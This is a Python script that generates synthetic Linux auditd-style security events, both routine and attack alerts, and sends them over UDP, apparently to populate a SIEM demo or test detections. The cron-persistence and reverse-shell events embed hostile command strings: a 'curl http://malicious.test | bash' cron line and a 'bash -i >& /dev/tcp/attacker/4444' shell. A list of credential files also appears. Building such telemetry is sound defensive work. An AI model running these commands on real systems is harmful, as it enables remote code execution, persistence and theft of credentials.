#!/usr/bin/env python3
"""
linux_generator.py

Realistic Linux Security Telemetry Generator.

Integrated with:

- common_inventory.py
- behavior_engine.py
- simulation_engine.py


Simulates:

- Linux auditd
- SSH activity
- sudo usage
- service changes
- privilege escalation
- persistence
"""


import argparse
import json
import random
import socket
import time
import uuid


from datetime import datetime, timezone



from common_inventory import (

    choose_user,

    user_doc,

    server_ip,

    server_name,

    server_host_doc,

    DOC_IPS

)



from behavior_engine import enrich_event



from simulation_engine import (

    get_event_delay,

    should_generate_alert

)





LINUX_HOSTS=[

    "LINUX-WEB01",

    "LINUX-APP01",

    "LINUX-JUMP01"

]



NORMAL_COMMANDS=[

    "systemctl status nginx",

    "apt update",

    "docker ps",

    "df -h",

    "tail /var/log/syslog",

    "journalctl -xe"

]



SENSITIVE_FILES=[

    "/etc/shadow",

    "/etc/passwd",

    "/root/.ssh/id_rsa",

    "/var/log/auth.log"

]



SERVICES=[

    "nginx",

    "docker",

    "ssh",

    "postgresql"

]





# ============================================================
# HELPERS
# ============================================================



def now_iso():


    return datetime.now(

        timezone.utc

    ).strftime(

        "%Y-%m-%dT%H:%M:%S.%f"

    )[:-3]+"Z"





def entity_id():

    return uuid.uuid4().hex[:16]





def hash_value(length):

    return "".join(

        random.choices(

            "0123456789abcdef",

            k=length

        )

    )





def campaign(

    campaign_id,

    stage,

    tactic

):


    return {


        "campaign_id":

        campaign_id,


        "stage":

        stage,


        "tactic":

        tactic

    }





def choose_linux_host():


    return random.choice(

        LINUX_HOSTS

    )





# ============================================================
# BASE EVENT
# ============================================================



def base_event(

    action,

    category,

    severity=1,

    kind="event",

    outcome="success"

):


    return {


        "@timestamp":

        now_iso(),



        "ecs":{

            "version":

            "8.17.0"

        },



        "data_stream":{

            "type":

            "logs",


            "dataset":

            "linux.security",


            "namespace":

            "default"

        },



        "event":{


            "id":

            str(uuid.uuid4()),


            "kind":

            kind,


            "category":

            category,


            "action":

            action,


            "outcome":

            outcome,


            "severity":

            severity,


            "risk_score":

            severity*10,


            "module":

            "linux"

        },



        "agent":{


            "type":

            "auditd",


            "version":

            "3.1"

        },



        "tags":[

            "linux",

            "auditd",

            "security",

            "demo"

        ]

    }





# ============================================================
# LINUX CONTEXT
# ============================================================



def add_linux_context(

    event,

    user,

    host,

    action

):


    event["user"]=user_doc(user)



    event["host"]=server_host_doc(host)



    event["source"]={

        "ip":

        user["ip"],


        "port":

        random.randint(

            40000,

            60000

        )

    }



    event["destination"]={

        "ip":

        server_ip(host)

    }



    event["related"]={


        "ip":[

            user["ip"],

            server_ip(host)

        ],


        "hosts":[

            host,

            user["host"]

        ],


        "user":[

            user["name"]

        ]

    }




    enrich_event(

        event,

        user,

        host=user["host"],

        source_ip=user["ip"],

        server=host,

        action=action

    )



    return event





# ============================================================
# NORMAL LINUX EVENTS
# ============================================================



def ssh_login_success():


    user=choose_user()


    host=choose_linux_host()



    event=base_event(

        "ssh-login-success",

        ["authentication","session"],

        severity=1

    )



    add_linux_context(

        event,

        user,

        host,

        "ssh_login"

    )



    event["process"]={


        "name":

        "sshd",


        "pid":

        random.randint(

            1000,

            5000

        )

    }



    event["auditd"]={


        "type":

        "USER_LOGIN",


        "result":

        "success"

    }



    event["message"]=(
        f"SSH login by {user['name']} "
        f"to {host}"
    )



    return event

# ============================================================
# NORMAL LINUX EVENTS
# ============================================================



def sudo_command():


    user=choose_user(role="it_admin")


    host=choose_linux_host()


    command=random.choice(

        NORMAL_COMMANDS

    )



    event=base_event(

        "sudo-command-executed",

        ["process","iam"],

        severity=2

    )



    add_linux_context(

        event,

        user,

        host,

        "sudo_command"

    )



    event["process"]={


        "name":

        "sudo",


        "command_line":

        command,


        "user":

        user["name"]

    }



    event["auditd"]={


        "type":

        "USER_CMD",


        "result":

        "success"

    }



    event["message"]=(
        f"sudo command by "
        f"{user['name']}: {command}"
    )



    return event





def package_install():


    user=choose_user(role="it_admin")


    host=choose_linux_host()


    package=random.choice(

        [

        "nginx",

        "docker",

        "python3",

        "postgresql-client",

        "fail2ban"

        ]

    )



    event=base_event(

        "package-installed",

        ["package"],

        severity=2

    )



    add_linux_context(

        event,

        user,

        host,

        "package_install"

    )



    event["package"]={


        "name":

        package,


        "version":

        f"{random.randint(1,5)}.{random.randint(0,9)}"

    }



    return event





def service_change():


    user=choose_user(role="it_admin")


    host=choose_linux_host()


    service=random.choice(

        SERVICES

    )



    event=base_event(

        "service-change",

        ["service","configuration"],

        severity=2

    )



    add_linux_context(

        event,

        user,

        host,

        "service_change"

    )



    event["service"]={


        "name":

        service,


        "state":

        "restarted"

    }



    return event





# ============================================================
# LINUX ATTACK EVENTS
# ============================================================




def ssh_bruteforce():


    user=choose_user()


    host=choose_linux_host()


    attacker=random.choice(

        DOC_IPS

    )



    event=base_event(

        "ssh-bruteforce",

        ["authentication"],

        severity=8,

        kind="alert",

        outcome="failure"

    )



    event["user"]=user_doc(user)



    event["source"]={


        "ip":

        attacker

    }



    event["destination"]={


        "ip":

        server_ip(host),


        "port":

        22

    }



    event["attack"]=campaign(

        "LINUX-SSH-001",

        "credential_access",

        "TA0006"

    )



    event["rule"]={


        "name":

        "SSH Brute Force Detected",


        "category":

        "authentication-risk"

    }



    event["message"]=(
        f"SSH brute force against "
        f"{host}"
    )



    return event





def privilege_escalation_linux():


    user=choose_user()


    host=choose_linux_host()



    event=base_event(

        "root-privilege-escalation",

        ["iam","process"],

        severity=9,

        kind="alert"

    )



    add_linux_context(

        event,

        user,

        host,

        "privilege_escalation"

    )



    event["process"]={


        "name":

        "sudo",


        "command_line":

        "sudo -i"

    }



    event["attack"]=campaign(

        "LINUX-PRIV-001",

        "privilege_escalation",

        "TA0004"

    )



    event["rule"]={


        "name":

        "Unexpected Root Privilege Escalation",


        "category":

        "privilege-escalation"

    }



    return event





def cron_persistence():


    user=choose_user()


    host=choose_linux_host()



    event=base_event(

        "cron-persistence-created",

        ["persistence","process"],

        severity=8,

        kind="alert"

    )



    add_linux_context(

        event,

        user,

        host,

        "cron_persistence"

    )



    event["file"]={


        "path":

        "/etc/cron.d/system-update"

    }



    event["process"]={


        "name":

        "crontab",


        "command_line":

        "* * * * * curl http://malicious.test | bash"

    }



    event["attack"]=campaign(

        "LINUX-PERSIST-001",

        "persistence",

        "TA0003"

    )



    return event





def reverse_shell():


    user=choose_user()


    host=choose_linux_host()



    destination=random.choice(

        DOC_IPS

    )



    event=base_event(

        "reverse-shell-executed",

        ["process","network"],

        severity=10,

        kind="alert"

    )



    add_linux_context(

        event,

        user,

        host,

        "reverse_shell"

    )



    event["process"]={


        "name":

        "bash",


        "command_line":

        "bash -i >& /dev/tcp/attacker/4444"

    }



    event["destination"]={


        "ip":

        destination,


        "port":

        4444

    }



    event["attack"]=campaign(

        "LINUX-C2-001",

        "command_and_control",

        "TA0011"

    )



    return event





def credential_access_linux():


    user=choose_user()


    host=choose_linux_host()



    event=base_event(

        "sensitive-file-access",

        ["file"],

        severity=9,

        kind="alert"

    )



    add_linux_context(

        event,

        user,

        host,

        "credential_access"

    )



    event["file"]={


        "path":

        random.choice(

            SENSITIVE_FILES

        )

    }



    event["attack"]=campaign(

        "LINUX-CRED-001",

        "credential_access",

        "TA0006"

    )



    return event

# ============================================================
# EVENT DISTRIBUTION
# ============================================================



NORMAL_EVENTS=[

    ssh_login_success,

    ssh_login_success,

    sudo_command,

    package_install,

    service_change

]



ALERT_EVENTS=[

    ssh_bruteforce,

    privilege_escalation_linux,

    cron_persistence,

    reverse_shell,

    credential_access_linux

]





def choose_event():


    if should_generate_alert(

        "linux"

    ):

        return random.choice(

            ALERT_EVENTS

        )


    return random.choice(

        NORMAL_EVENTS

    )





# ============================================================
# MAIN LOOP
# ============================================================



def main():


    parser=argparse.ArgumentParser(

        description=

        "Realistic Linux Audit Generator"

    )


    parser.add_argument(

        "--host",

        default="127.0.0.1"

    )


    parser.add_argument(

        "--port",

        type=int,

        default=5605

    )


    parser.add_argument(

        "--rate",

        type=float,

        default=6

    )


    parser.add_argument(

        "--duration",

        type=int,

        default=0

    )



    args=parser.parse_args()



    sock=socket.socket(

        socket.AF_INET,

        socket.SOCK_DGRAM

    )



    start=time.time()

    sent=0



    print(

        f"[LINUX] sending to "

        f"{args.host}:{args.port}"

    )




    try:


        while True:


            if args.duration > 0:


                if time.time()-start >= args.duration:

                    break




            builder=choose_event()



            event=builder()



            sock.sendto(

                json.dumps(

                    event,

                    separators=(

                        ",",

                        ":"

                    )

                ).encode(),

                (

                    args.host,

                    args.port

                )

            )



            sent += 1



            time.sleep(

                get_event_delay(

                    args.rate

                )

            )




    except KeyboardInterrupt:


        print(

            "Stopped by user"

        )



    finally:


        sock.close()



        print(

            f"[LINUX] sent={sent}"

        )





if __name__=="__main__":


    main()
